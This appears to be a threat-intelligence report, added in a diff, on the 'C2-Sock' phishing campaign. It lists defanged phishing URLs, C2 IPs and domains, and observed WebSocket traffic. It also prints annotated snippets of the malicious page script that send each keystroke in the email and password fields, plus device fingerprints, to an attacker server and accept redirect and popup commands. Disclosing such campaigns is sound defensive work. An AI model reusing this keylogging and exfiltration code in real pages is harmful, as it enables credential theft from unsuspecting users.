@@ -1,0 +1,241 @@
+2025-10-15 (WEDNESDAY): "C2-SOCK" PHISHING CAMPAIGN
+
+AUTHORS:
+
+- Howard Tong, Keerthiraj Nagaraj, Shehroze Farooqi, Alex Starov
+
+NOTES:
+
+- We have identified phishing activity that we've nicknamed "C2-Sock" phishing
+- The campaign uses a malicious script for activity like keylogging and stealing credentials
+- This also allows changing web content (redirects/popups) in real-time via WebSockets by building a persistent connection. 
+- This phishing content streams everything you type, and it fingerprints your device for tracking
+
+DETAILS:
+
+- This campaign uses Chinese language phishing pages, and it uses China (.cn) top-level domains (TLDs).
+- This type of phishing kit combines credential theft with live session interaction.
+- The kit allows attackers to control web page content in real-time. 
+- Like traditional phishing, this kit captures submitted form data.
+- But it also establishes a persistent command-and-control (C2) channel within the victim's browser.
+
+CORE CAPABILITIES:
+
+- Live Keylogging & Credential Theft: 
+  -- The kit captures everything a user types into its form fields, like emails and passwords
+  -- It streams the keystrokes in real-time to a remote server using WebSockets. 
+  -- This means attackers can see credentials even if the user never clicks a submit button.
+- Dynamic Web Page Content: 
+  -- Attackers can send commands to the victim's browser to perform malicious actions on the fly, including:
+     --- Forcing the browser to redirect to another malicious URL.
+     --- Triggering custom popups with server-controlled messages and buttons.
+     -- Displaying fake error messages to deceive the user.
+- Victim Tracking & Fingerprinting:
+  -- The script builds a detailed and persistent profile for each victim.
+  -- It fingerprints the device by collecting operating system and browser information.
+  -- It sets a unique tracking ID in the browser's localStorage to identify and monitor the victim across multiple sessions.
+  -- It even tracks touchscreen coordinates on mobile devices to monitor user interaction.
+
+CAMPAIGN INFRASTRUCTURE:
+
+- The campaign is widespread, with over 13,000 URLs observed. 
+- The attackers leverage a small set of hosting infrastructure to support their operations. 
+- For instance, 171.22.193[.]27 has hosted 900+ malicious domains for this campaign in the last 6 months.
+
+EXAMPLES OF RECENT PHISHING URLS FROM THIS CAMPAIGN:
+
+NOTE: The following examples were likely sent through phishing emails, with at least one confirmation as noted below.
+
+2 EXAMPLES OF C2-SOCK PHISHING URLS SEEN AS EARLY AS 2025-10-14:
+
+  hxxp[:]//96757.hwqbg[.]cn/?name=[recipient's email address]  <-- confirmed from 2025-10-14 email submitted to VirusTotal
+hxxp[:]//4726818.hwqbg[.]cn/?name=[recipient's email address]
+
+18 EXAMPLES OF C2-SOCK PHISHING URLS SEEN AS EARLY AS 2025-10-12:
+
+       hxxp[:]//83.jfkxn[.]cn/?name=[recipient's email address]
+       hxxp[:]//86.jfkxn[.]cn/?name=[recipient's email address]
+      hxxp[:]//418.jfkxn[.]cn/?name=[recipient's email address]
+      hxxp[:]//961.jfkxn[.]cn/?name=[recipient's email address]
+     hxxp[:]//6839.jfkxn[.]cn/?name=[recipient's email address]
+     hxxp[:]//8341.jfkxn[.]cn/?name=[recipient's email address]
+    hxxp[:]//30094.jfkxn[.]cn/?name=[recipient's email address]
+    hxxp[:]//47434.jfkxn[.]cn/?name=[recipient's email address]
+    hxxp[:]//87859.jfkxn[.]cn/?name=[recipient's email address]
+    hxxp[:]//91617.jfkxn[.]cn/?name=[recipient's email address]
+   hxxp[:]//723954.jfkxn[.]cn/?name=[recipient's email address]
+   hxxp[:]//796507.jfkxn[.]cn/?name=[recipient's email address]
+  hxxp[:]//9038901.jfkxn[.]cn/?name=[recipient's email address]
+  hxxp[:]//2748802.jfkxn[.]cn/?name=[recipient's email address]
+  hxxp[:]//7565906.jfkxn[.]cn/?name=[recipient's email address]
+hxxp[:]//193427865.jfkxn[.]cn/?name=[recipient's email address]
+hxxp[:]//285122977.jfkxn[.]cn/?name=[recipient's email address]
+hxxp[:]//820483838.jfkxn[.]cn/?name=[recipient's email address]
+
+18 EXAMPLES OF C2-SOCK ßPHISHING URLS SEEN AS EARLY AS 2025-10-09:
+
+      hxxp[:]//10.nkcrb[.]cn/?name=[recipient's email address]
+      hxxp[:]//30.nkcrb[.]cn/?name=[recipient's email address]
+      hxxp[:]//224.nkcrb[.]cn/?name=[recipient's email address]
+      hxxp[:]//341.nkcrb[.]cn/?name=[recipient's email address]
+      hxxp[:]//526.nkcrb[.]cn/?name=[recipient's email address]
+      hxxp[:]//664.nkcrb[.]cn/?name=[recipient's email address]
+      hxxp[:]//796.nkcrb[.]cn/?name=[recipient's email address]
+     hxxp[:]//2803.nkcrb[.]cn/?name=[recipient's email address]
+     hxxp[:]//3237.nkcrb[.]cn/?name=[recipient's email address]
+    hxxp[:]//02354.nkcrb[.]cn/?name=[recipient's email address]
+    hxxp[:]//55068.nkcrb[.]cn/?name=[recipient's email address]
+   hxxp[:]//437142.nkcrb[.]cn/?name=[recipient's email address]
+  hxxp[:]//4129800.nkcrb[.]cn/?name=[recipient's email address]
+  hxxp[:]//6131434.nkcrb[.]cn/?name=[recipient's email address]
+ hxxp[:]//33898017.nkcrb[.]cn/?name=[recipient's email address]
+ hxxp[:]//56591949.nkcrb[.]cn/?name=[recipient's email address]
+hxxp[:]//731494636.nkcrb[.]cn/?name=[recipient's email address]
+hxxp[:]//966131149.nkcrb[.]cn/?name=[recipient's email address]
+
+CURRENT C2 SERVER FOR THE WEBSOCKETS TRAFFIC, AS OF 2025-10-15:
+
+- 171.22.193[.]37:2012 - rtwmh[.]cn - TLSv1.2 HTTPS traffic
+
+OTHER DOMAINS IN PHISHING URLS WE'VE SEEN FROM THIS CAMPAIGN:
+
+- 00.audibs99o[.]cn
+- dm15025174.fcnrs[.]cn
+- fw-hu[.]cn
+- jbsgfchj[.]cn
+- lcjrz[.]cn
+- lqkypt[.]cn
+- qngnj[.]cn
+- qwyuxbp[.]cn
+- rbemwlx[.]cn
+- rgfdd[.]cn
+- tnfpx1[.]cn
+- wdxocrh[.]cn
+- wdxocrh[.]cn
+- rufeng.kngnj[.]cn
+- vljuguyn.iicmv11[.]cn
+- yumen.qccgl[.]cn
+- zhongbei.iicmv11[.]cn
+- zhouding.qccgl[.]cn
+- zppkq.fcnrs[.]cn
+
+ONE OF THE PREVIOUS C2 SERVERS FOR THE WEBSOCKETS TRAFFIC:
+
+- 171.22.193[.]27:2012 - um-71[.]cn - TLSv1.2 HTTPS traffic
+
+EXAMPLE OF URLS GENERATED BY VIEWING ONE OF THESE PHISHING PAGES (FROM 2025-10-15):
+
+- hxxp[:]//7565906.jfkxn[.]cn/?name=[potential victim's email address]
+- hxxp[:]//7565906.jfkxn[.]cn/1/shouye.php?name=[potential victim's email address]
+- hxxp[:]//7565906.jfkxn[.]cn/1/img/1.jpg
+- hxxp[:]//7565906.jfkxn[.]cn/1/img/1.gif
+- hxxp[:]//7565906.jfkxn[.]cn/js/jquery-2.0.2.min.js
+- hxxp[:]//7565906.jfkxn[.]cn/layui-v2.7.6/layui/layui.js
+- hxxp[:]//7565906.jfkxn[.]cn/socket/dist/socket.io.min.js
+- hxxp[:]//7565906.jfkxn[.]cn/1/js/xm.js
+- hxxp[:]//7565906.jfkxn[.]cn/1/shouye.php?name=[potential victim's email address]
+- hxxp[:]//7565906.jfkxn[.]cn/layui-v2.7.6/layui/layui.js
+- hxxp[:]//7565906.jfkxn[.]cn/layui-v2.7.6/layui/css/modules/laydate/default/laydate.css?v=5.3.1
+- hxxp[:]//7565906.jfkxn[.]cn/layui-v2.7.6/layui/css/modules/layer/default/layer.css?v=3.5.1
+- hxxp[:]//7565906.jfkxn[.]cn/layui-v2.7.6/layui/css/modules/code.css?v=3
+- hxxp[:]//7565906.jfkxn[.]cn/favicon.ico
+
+WEBSOCKETS TRAFFIC TO C2 SERVER CAUSED BY THE ABOVE PHISHING PAGE EXAMPLE:
+
+- hxxps[:]//rtwmh[.]cn:2012/canshu1/canshu
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYB48
+- hxxps[:]//rtwmh[.]cn:2012/qiantaizhuanyon_chaxun/chaxunkaiguan
+- hxxps[:]//rtwmh[.]cn:2012/zhilingtai1/zhilingtai
+- hxxps[:]//rtwmh[.]cn:2012/qiantaizhuanyon_chaxun/chaxunhoutaicanshu
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYBw8&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYBwC&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=websocket&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYC8N&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYC8V&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYCMI&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYCMQ&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/socket.io/?suiji=b2KcU2gWSOzi&EIO=4&transport=polling&t=PdfYCSo&sid=e26Rjq_7QQM5TbGNAZ40
+- hxxps[:]//rtwmh[.]cn:2012/qiantaizhuanyon_chaxun/chaxunhoutaicanshu
+- hxxps[:]//rtwmh[.]cn:2012/qiantaizhuanyon_chaxun/chaxunkaiguan
+- hxxps[:]//rtwmh[.]cn:2012/chuanshu1/chuanshu?qishixianshi=13
+- hxxps[:]//rtwmh[.]cn:2012/zhilingtai1/zhilingtai
+- hxxps[:]//rtwmh[.]cn:2012/zhilingtai1/zhilingtai
+
+CODE SNIPPETS FROM PAGE:
+
+NOTE: The following is from script returned from hxxp[:]//7565906.jfkxn[.]cn/1/js/xm.js on 2025-10-15.
+      SHA256 hash for the returned script is: e8137222931af90e2bdc73e56354270aeb4e1e61e2e7c214b943f864e5c1135c
+
+1. C2 Channel Establishment: 
+  - This line of code initiates the WebSocket connection to the attacker-controlled C2 server. 
+  - A randomly generated session variable is passed as a parameter to uniquely identify the victim's session.
+
+   socket=io(`hxxps[:]//rtwmh[.]cn:2012?suiji=`+sessionVariable);
+
+2. Live Keylogging and Exfiltration:
+  - The script adds event listeners to the email (rmz) and password (sfzj) input fields. 
+  - The shishijiankong1 function is triggered on every input event (i.e., every keystroke)
+  - This function immediately sending the typed character and the field name to the C2 server.
+
+    // Function to send keystrokes to the C2 server in real-time
+    function shishijiankong1(canshu,canshu1){
+        socket.emit("sendMsg",{"kongzhi":"8","xinxi":canshu1,"neirong":canshu.value});
+    }
+
+    // Attaches the keylogging function to the email and password fields
+    id("sfzj").addEventListener("input",function(){shishijiankong1(id("sfzj"),"邮箱密码：")});
+    id("rmz").addEventListener("input",function(){shishijiankong1(id("rmz"),"邮箱账号：")});
+
+3. Remote Command Execution:
+  - This block acts as a command handler. 
+  - It listens for pushMsg events from the C2 server. 
+  - Based on the kongzhi value received, it executes different malicious actions, such as:
+    -- displaying a popup (kongzhi=="1") 
+    -- forcing a browser redirect (kongzhi=="2")
+
+    // Listens for and executes commands sent from the C2 server
+    socket.on('pushMsg',function(data){
+        var fanhuia=data;
+        if(fanhuia.kongzhi=="1"){
+            // Displays a server-controlled popup message
+            layer.open({
+                title: '信息',
+                content: fanhuia.neirong
+            });
+        } else if(fanhuia.kongzhi=="2"){
+            if(fanhuia.shifouqiangzhi=="强制跳转"){
+                // Forces the browser to redirect to a URL provided by the attacker
+                socket.emit('sendMsg',{"kongzhi":"16","fankui":"对方已经成功接收指令!"});
+                window.location.href=fanhuia.zhiling;
+            }
+        }
+    })
+
+4. Victim Fingerprinting and Tracking:
+  - This code gathers system and browser information, which is then sent to the C2 server via an AJAX POST request.
+  - This allows the attacker to profile the victim's device.
+
+    // Determines the victim's operating system (Android/iOS)
+    function panduanfangwen(){
+         var userAgent = navigator.userAgent;
+        var isiOS = !!userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+        var isAndroid = userAgent.indexOf('Android') > -1 || userAgent.indexOf('Adr') > -1;
+        if(isAndroid==true){ return "安卓手机访问Android"; }
+        else if(isiOS==true){ return "苹果手机访问iOS"; }
+    }
+
+    // Determines the victim's browser type
+    function matchVersion() { /* ... browser detection logic ... */ }
+
+    // Sends the collected fingerprinting data to the C2 server
+    $.ajax({
+        type: 'POST',
+        url: 'hxxps[:]//rtwmh[.]cn:2012/canshu1/canshu',
+        data:{
+            'suijishu':sessionVariable,
+            'xitongxinxi':panduanfangwen,
+            'liulanqixinxi':matchVersion,
+            'referrer':rootDomain,
+        },
+        //...
+    });
